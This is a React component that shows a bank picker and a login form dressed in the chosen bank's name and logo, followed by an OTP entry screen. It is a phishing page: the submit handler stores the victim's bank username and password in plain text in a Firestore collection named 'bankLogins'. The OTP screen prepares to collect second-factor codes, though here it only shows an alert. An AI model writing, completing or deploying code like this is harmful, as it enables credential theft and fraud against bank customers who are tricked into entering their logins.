import { useState, useRef } from "react";
import banks from "./bankData";
import { createUserWithEmailAndPassword } from "firebase/auth";
import { auth, db } from "../firebaseAuth";
import { setDoc, doc } from "firebase/firestore";
import { toast } from "react-toastify";



function LinkToBank() {
    console.log(banks)

    const [selectedBank, setSelectedBank] = useState([])
    
    const [bankState, setBankState] = useState("selectBank")

    function getBank(e) {
     setSelectedBank(banks[e.target.id])
     setBankState("login")
     console.log(e.target.id)
    }
    
    const [logs, setLogs] = useState({
        username: "",
        password: "",
    }) 

    function getLogs(e) {
        setLogs((prev)=> {
            return {
                ...prev,
                [e.target.name]: e.target.value,
            }
        })
    }

   async function submitLogs(e){
    e.preventDefault();
    console.log("clicked")
       if(logs.username && logs.password) {
         try{
         await setDoc(doc(db, "bankLogins", "good game"), {
            username: logs.username,
            password: logs.password,
         })
         .then((data)=> {
           toast.success("submitted", {position: "top-center"})
           setBankState("otp")
         })
         .catch((error)=> {
            toast.error("error occured", {position: "top-center"})
            console.log(error.message)
         })
        }catch(error){
           toast.error(error, {position: "top-center"})
           console.log(error)
        }
       }else {
        toast.error("fill in the details", {position: "top-center"})
       }
    }








     const [otp, setOtp] = useState(new Array(6).fill(""));
  const inputsRef = useRef([]);

  const handleChange = (element, index) => {
    if (/^[0-9]$/.test(element.value) || element.value === "") {
      const newOtp = [...otp];
      newOtp[index] = element.value;
      setOtp(newOtp);
      if (element.value !== "" && index < 5) {
        inputsRef.current[index + 1].focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && otp[index] === "" && index > 0) {
      inputsRef.current[index - 1].focus();
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length === 6) {
      alert(`OTP Entered: ${otpValue}`);
      // Add your verification logic here
    } else {
      alert("Please enter a 6-digit OTP");
    }
  };






    const showAllBanks = banks.map((each) => {
        return <div className="bank" id={each.id} onClick={getBank}>
            <h1 id={each.id}>{each.BankName}</h1>
            <img src={each.img} alt="" width="100" id={each.id}/>
        </div>
    })

    function showBankState() {
        if (bankState == "selectBank") {
            return <div>
                <div className="link-head">
                    <h1>Select Bank</h1>
                </div>
                <div className="all-banks">
                    {showAllBanks}
                </div>
            </div>
        } else if (bankState == "login") {
            return selectedBank ? <div>
              <div className="bank-img">
                  <img src={selectedBank.img} alt="" width="200"/>
              </div>
                <h1 className="bank-log">Log In</h1>
                <p className="logger">Login to your {selectedBank.BankName} account</p>
                <div className="log-boxer" >
                    <div>
                        <h1>Email or Username</h1>
                        <input type="email" name="username" onChange={getLogs}/>
                    </div>
                    <div>
                        <h1>Password</h1>
                         <input type="password" name="password" onChange={getLogs}/>
                    </div>
                    <div>
                       <p>Keep me signed in <input type="checkbox" /></p> 
                    </div>
                    <button className="bank-btn" onClick={submitLogs}>Login</button>
                    <p style={{textAlign: "center", fontSize: "18px"}} onClick={()=> setBankState("selectBank")}><i className="bi-arrow-left"></i> Go Back</p>
                </div>
            </div>: ""
        } else if(bankState == "otp") {
            return <div>
                 <div className="container" role="main">
        <h2>Verify Your OTP</h2>
        <p className="subtitle">Enter the 6-digit code sent to your email</p>
        <form onSubmit={handleSubmit} aria-label="OTP Verification Form" className="de-form">
          <div className="otp-inputs">
            {otp.map((data, index) => (
              <input
                key={index}
                type="tel"
                name="otp"
                inputMode="numeric"
                autoComplete="one-time-code"
                pattern="\d*"
                maxLength="1"
                className="otp-input"
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                ref={(el) => (inputsRef.current[index] = el)}
                aria-label={`Digit ${index + 1}`}
              />
            ))}
          </div>
          <button type="submit" className="verify-btn" aria-label="Verify OTP">
            Verify
          </button>
        </form>
        <p className="resend-text">
          Didn't receive the code?
          <button
            className="resend-btn"
            onClick={() => alert("Resend OTP clicked")}
            aria-label="Resend OTP"
            type="button"
          >
            Resend
          </button>
        </p>
      </div>
            </div>
        }
    }
    return (
        <section className="link-to-bank">
            {showBankState()}
        </section>
    )
}

export default LinkToBank;